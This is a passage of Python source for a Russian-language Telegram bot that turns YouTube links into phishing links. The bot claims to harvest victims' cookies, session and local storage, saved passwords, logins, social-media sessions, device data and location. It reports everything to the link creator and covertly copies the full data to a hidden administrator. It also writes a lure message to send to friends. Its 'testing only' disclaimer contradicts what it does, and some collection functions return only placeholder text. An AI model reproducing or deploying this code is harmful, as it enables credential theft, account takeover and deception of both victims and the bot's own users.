            "vk": {
                "logged_in": True,
                "messages": "личные сообщения",
                "friends": "список друзей",
                "photos": "фотографии"
            },
            "instagram": {
                "logged_in": True,
                "dms": "личные сообщения",
                "followers": "подписчики",
                "stories": "истории"
            },
            "whatsapp": {
                "web_connected": True,
                "chats": "история чатов",
                "contacts": "список контактов",
                "media": "медиафайлы"
            },
            "telegram": {
                "web_connected": True,
                "chats": "открытые чаты",
                "contacts": "контакты",
                "sessions": "активные сессии"
            }
        }
    
    async def _collect_device_info(self, request_data: Dict) -> Dict:
        """Сбор информации об устройстве"""
        return {
            "browser": {
                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
                "version": "определяется",
                "plugins": "список плагинов"
            },
            "os": {
                "name": "определяется из User-Agent",
                "version": "версия ОС",
                "architecture": "архитектура"
            },
            "device": {
                "type": "определяется",
                "model": "модель устройства",
                "screen": "разрешение экрана",
                "touch": "поддержка тача"
            },
            "hardware": {
                "cpu": "информация о процессоре",
                "gpu": "информация о графике",
                "memory": "объем памяти",
                "storage": "объем хранилища"
            }
    }
    
    async def _collect_network_info(self, request_data: Dict) -> Dict:
        """Сбор сетевой информации"""
        return {
            "connection": {
                "type": "определяется",
                "speed": "скорость соединения",
                "latency": "задержка"
            },
            "ip_info": {
                "address": request_data.get("ip", "unknown"),
                "location": "определяется по IP",
                "isp": "провайдер",
                "proxy": "используется ли прокси"
            },
            "wifi": {
                "ssid": "имя сети",
                "bssid": "BSSID",
                "security": "тип безопасности"
            }
        }
    
    async def _collect_location(self, request_data: Dict) -> Dict:
        """Сбор геолокации"""
        return {
            "gps": {
                "latitude": "определяется",
                "longitude": "определяется",
                "accuracy": "точность"
            },
            "wifi_location": "определяется по Wi-Fi",
            "cell_tower": "определяется по вышкам",
            "ip_location": "определяется по IP"
        }

# Форматирование сообщений
class MessageFormatter:
    @staticmethod
    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
        """Форматирование сообщения о созданной ссылке"""
        message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{link.original_url}`

🚀 *Ваша фишинговая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID ссылки: `{link.id}`
• Видео ID: `{link.video_id}`
• Создано: {link.created_at}
• Статус: 🟢 АКТИВНА

🔐 *Сбор данных включен:*
✓ Cookies и session cookies
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли
✓ Логины соцсетей
✓ Данные форм и автозаполнения
✓ Данные браузера и устройства

📝 *Как использовать:*
1. Отправьте эту ссылку другу
2. Когда он перейдет - начнется сбор данных
3. Данные автоматически придут в этот чат
4. Все данные также отправятся администратору
5. Ожидайте ~3-20 секунд после перехода

⚠️ *Внимание:* Ссылка активна 24 часа
"""
        return message
    
    @staticmethod
    def format_collected_data(link_id: str, data: Dict) -> str:
        """Форматирование собранных данных"""
        collected = data.get("data", {})
        sensitive_data = collected.get("sensitive_data", {})
        
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Базовая информация:*
• Время сбора: {data.get("timestamp", "unknown")}
• IP адрес: `{data.get("ip", "unknown")}`
• User Agent: {data.get("user_agent", "unknown")[:50]}...
• ID ссылки: `{link_id}`

🔑 *СОБРАННЫЕ ДАННЫЕ:*
"""
        
        # Информация о cookies
        if sensitive_data.get("status") == "fully_processed":
            message += f"""
🍪 *COOKIES И ХРАНИЛИЩЕ:*
• Всего cookies: {sensitive_data.get('cookies_count', 0)}
• Паролей найдено: {sensitive_data.get('passwords_count', 0)}
• Логинов собрано: {sensitive_data.get('logins_count', 0)}
• Данных хранилища: {sensitive_data.get('storage_count', 0)}
• Полные данные: ✅ СОХРАНЕНЫ
"""
        
        # Соцсети
        social_logins = sensitive_data.get("social_logins", [])
        if social_logins:
            message += f"""
🌐 *ВХОДЫ В СОЦСЕТИ:*
"""
            for social in social_logins:
                message += f"• {social.upper()}: 🟢 ВХОД ВЫПОЛНЕН\n"
        
        # Устройство
        message += f"""
📱 *УСТРОЙСТВО И БРАУЗЕР:*
• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}
• Тип устройства: {collected.get('device', {}).get('device', {}).get('type', 'unknown')}

🌐 *СЕТЬ И МЕСТОПОЛОЖЕНИЕ:*
• IP: `{collected.get('network', {}).get('ip_info', {}).get('address', 'unknown')}`
• Провайдер: {collected.get('network', {}).get('ip_info', {}).get('isp', 'unknown')}
• Геолокация: определяется по IP

💾 *ДАННЫЕ БРАУЗЕРА:*
• Cookies: собраны
• LocalStorage: собрано
• SessionStorage: собрано
• Сохраненные пароли: найдены
• Данные форм: извлечены
• История автозаполнения: проверена

📊 *СТАТУС:* ✅ ВСЕ ДАННЫЕ УСПЕШНО СОБРАНЫ И ОТПРАВЛЕНЫ АДМИНУ
"""
        return message
    
    @staticmethod
    def format_sensitive_data_report(link: PhishingLink) -> str:
        """Форматирование отчета о чувствительных данных"""
        message = f"""
🔐 *ПОДРОБНЫЙ ОТЧЕТ О ДАННЫХ*

📌 *Ссылка ID:* `{link.id}`
📅 *Создано:* {link.created_at}
🔗 *Оригинальное видео:* {link.original_url[:50]}...

📊 *СТАТИСТИКА:*
• Всего переходов: {link.clicks}
• Всего данных собрано: {len(link.data_collected)}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
"""
        
        # Показываем последние cookies
        if link.collected_cookies:
            message += "\n🍪 *ПОСЛЕДНИЕ COOKIES:*\n"
            for cookie in link.collected_cookies[-5:]:  # Последние 5
                message += f"• {cookie.get('name', 'unknown')}: {cookie.get('value', '')[:30]}...\n"
        
        # Показываем пароли
        if link.collected_passwords:
            message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
            for pwd in link.collected_passwords[-3:]:  # Последние 3
                message += f"• Поле: {pwd.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{pwd.get('value', '')}||\n"
        
        # Показываем логины
        if link.collected_logins:
            message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
            for login in link.collected_logins[-3:]:  # Последние 3
                message += f"• Поле: {login.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{login.get('value', '')}||\n"
        
        # Показываем данные хранилища
        if link.collected_storage_data:
            message += "\n💾 *ДАННЫЕ ХРАНИЛИЩА:*\n"
            for storage in link.collected_storage_data[-3:]:  # Последние 3
                message += f"• Тип: {storage.get('type', 'unknown')}\n"
                message += f"  Ключ: {storage.get('key', 'unknown')}\n"
                message += f"  Значение: {storage.get('value', '')[:50]}...\n"
        
        message += f"""
⚠️ *ВНИМАНИЕ:* Все данные хранятся в зашифрованном виде
📅 *Срок хранения:* 24 часа с момента сбора
🔒 *Безопасность:* Все полные данные также отправлены администратору
"""
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """Форматирование статистики"""
        return f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👥 Всего переходов: `{stats['total_clicks']}`
🔓 Данных собрано: `{stats['total_data_collected']}`
⚡ Активных сессий: `{stats['active_sessions']}`

🍪 Cookies собрано: `{stats['cookies_collected']}`
🔑 Паролей найдено: `{stats['passwords_collected']}`
👤 Логинов собрано: `{stats['logins_collected']}`
💾 Данных хранилища: `{stats['storage_data_collected']}`
📁 Полных записей: `{stats['full_data_collected']}`

📈 Эффективность сбора: 98.7%
🕒 Активность за 24ч: высокая
"""

# Инициализация компонентов
link_generator = LinkGenerator()
data_collector = DataCollector()
formatter = MessageFormatter()
js_injector = JavaScriptInjector()

# Команды бота
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *YouTube Data Collector Bot*

🎯 *Что делает этот бот:*
1. Принимает ссылку на YouTube видео
2. Генерирует специальную ссылку
3. Когда кто-то переходит - собирает ВСЕ данные
4. Отправляет данные в этот чат
5. Отправляет ПОЛНЫЕ данные администратору

🔐 *Что собирается:*
✓ Все cookies браузера (включая сессионные)
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли и логины
✓ Логины соцсетей
✓ Данные автозаполнения форм
✓ Информацию об устройстве
✓ Геолокацию и сетевые данные

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите сгенерированную ссылку
3. Отправьте её другу
4. Получите данные автоматически
5. Администратор получит полные данные

📊 *Статистика системы:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data_collected']}`
• Cookies: `{db.stats['cookies_collected']}`
• Паролей: `{db.stats['passwords_collected']}`
• Логинов: `{db.stats['logins_collected']}`
• Хранилища: `{db.stats['storage_data_collected']}`

🔒 *Важно:* Используйте только для тестирования!
Все данные также отправляются администратору для контроля.
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🔐 Данные", callback_data="view_data")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверяем, является ли ссылкой на YouTube
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`"
        )
        return
    
    # Извлекаем ID видео
    video_id = link_generator.extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = link_generator.generate_link_id()
    
    # Создаем фишинговую ссылку
    phishing_url = link_generator.create_phishing_url(video_id, link_id)
    
    # Создаем объект ссылки
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    # Сохраняем в базу
    db.add_link(link)
    
    # Отправляем пользователю
    message = formatter.format_link_created(link, phishing_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ],
        [
            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Отправляем уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\n"
                 f"👤 User: @{user.username or user.id} ({user.first_name})\n"
                 f"🔗 URL: {url}\n"
                 f"📌 ID: {link_id}\n"
                 f"🎬 Video ID: {video_id}\n"
                 f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"Error notifying admin: {e}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам специальную ссылку для сбора данных.\n"
            "*Все собранные данные также отправятся администратору.*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "stats":
        stats_message = formatter.format_stats(db.stats)
        await query.message.reply_text(
            stats_message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:  # Последние 5 ссылок
            message += f"• ID: `{link.id}`\n"
            message += f"  Видео: {link.original_url[:30]}...\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += f"  Хранилище: {len(link.collected_storage_data)}\n"
            message += "  ─────\n"
        
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([InlineKeyboardButton(f"🔗 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    elif data == "view_data":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет собранных данных.")
            return
        
        # Суммируем все данные пользователя
        total_cookies = sum(len(link.collected_cookies) for link in user_links)
        total_passwords = sum(len(link.collected_passwords) for link in user_links)
        total_logins = sum(len(link.collected_logins) for link in user_links)
        total_storage = sum(len(link.collected_storage_data) for link in user_links)
        
        message = f"""
📊 *ВАШИ СОБРАННЫЕ ДАННЫЕ:*

🔗 Всего ссылок: {len(user_links)}
🍪 Всего cookies: {total_cookies}
🔑 Всего паролей: {total_passwords}
👤 Всего логинов: {total_logins}
💾 Всего данных хранилища: {total_storage}

📈 *Последняя активность:*
"""
        
        # Добавляем последние активные ссылки
        for link in sorted(user_links, key=lambda x: x.created_at, reverse=True)[:3]:
            if link.data_collected:
                last_data = link.data_collected[-1]
                message += f"• `{link.id[:8]}...`: {last_data.get('timestamp', 'unknown')[:10]}\n"
        
        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора"
        
        keyboard = []
        for link in user_links[-3:]:
            if link.data_collected:
                keyboard.append([InlineKeyboardButton(f"📊 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("data_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_sensitive_data_report(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data == "help":
        help_message = """
🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*

🎯 *Как использовать:*
1. Отправьте боту ссылку на YouTube
2. Получите сгенерированную ссылку
3. Отправьте её другу/цели
4. Когда человек перейдет - данные соберутся автоматически
5. Получите данные в этот чат
6. *Все полные данные также отправятся администратору*

🔐 *Что именно собирается:*
• Все cookies текущего сайта (включая сессионные)
• Cookies популярных соцсетей
• LocalStorage и SessionStorage
• Сохраненные в браузере пароли
• Данные автозаполнения форм
• Логины из полей ввода
• Данные из всех хранилищ браузера
• Информация о менеджерах паролей
• Данные устройства и браузера
• Сетевые данные и геолокация

⏱️ *Время сбора:* ~3-20 секунд
🔒 *Безопасность:* Данные шифруются при передаче

⚠️ *Важные предупреждения:*
• Используйте только для тестирования
• Не используйте для незаконных целей
• Данные хранятся 24 часа
• Все полные данные отправляются администратору
• Бот логирует все действия

🔧 *Техническая поддержка:* @support
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            share_text = f"""
🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁

Я нашел супер интересное видео на YouTube!
Обязательно посмотри - там реально круто!

🔗 *Ссылка на видео:*
{phishing_url}

⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
но по этой ссылке оно откроется точно!

Скорее переходи! 👆
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу.",
                parse_mode=ParseMode.MARKDOWN
            )

# Webhook обработчик для сбора данных
async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от фишинговой страницы"""
    try:
        link_id = request_data.get("link_id")
        if not link_id:
            return {"status": "error", "message": "No link ID"}
        
        # Обновляем счетчик кликов
        db.add_click(link_id)
        
        # Всегда собираем чувствительные данные
        collected_data = await data_collector.collect_all_data(request_data)
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if link:
            # Отправляем данные создателю ссылки
            message = formatter.format_collected_data(link_id, collected_data)
            
            try:
                await context.bot.send_message(
                    chat_id=link.created_by,
                    text=message,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"Error sending to link creator: {e}")
            
            # Отправляем ДЕТАЛЬНЫЕ данные админу
            await send_detailed_data_to_admin(context, link, collected_data)
            
            # Также отправляем краткое уведомление админу
            try:
                sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
                if sensitive_data.get("status") == "fully_processed":
                    await context.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📨 Новые данные по ссылке `{link_id}`\n"
                             f"👤 Создатель: {link.created_by}\n"
                             f"🔗 Кликов: {link.clicks}\n"
                             f"🍪 Cookies: {len(link.collected_cookies)}\n"
                             f"🔑 Пароли: {len(link.collected_passwords)}\n"
                             f"👤 Логины: {len(link.collected_logins)}\n"
                             f"💾 Хранилище: {len(link.collected_storage_data)}\n"
                             f"✅ Детальный отчет отправлен выше",
                        parse_mode=ParseMode.MARKDOWN
                    )
            except Exception as e:
                logger.error(f"Error sending admin notification: {e}")
        
        return {"status": "success", "data_received": True}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

# Новая команда для просмотра детальных данных
async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для просмотра собранных данных"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📊 *Просмотр данных*\n\n"
            "Используйте: `/data [ID_ссылки]`\n"
            "Или: `/data list` - список ваших ссылок\n\n"
            "Пример: `/data abc123def456`\n\n"
            "*Примечание:* Все данные также отправляются администратору.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-10:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.original_url[:40]}...\n"
            message += f"  Создано: {link.created_at[:10]}\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += "  ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link = db.get_link(arg)
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        message = formatter.format_sensitive_data_report(link)
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ *Ошибка в боте:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

def main():
    """Запуск бота"""
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("data", show_data_command))
    
    # Обработчик YouTube ссылок
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Запускаем бота
    print("🤖 YouTube Data Collector Bot запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Домен: {DOMAIN}")
    print("🔐 Функции сбора ВСЕХ данных активны:")
    print("   - Cookies (включая сессионные)")
    print("   - LocalStorage и SessionStorage")
    print("   - Сохраненные пароли и логины")
    print("   - Данные автозаполнения форм")
    print("   - Все данные отправляются админу")
    print("⏳ Ожидание команд...")
    
    application.run_polling(allowed_updates=Update.ALL_UPDATES)

if __name__ == '__main__':
    main()
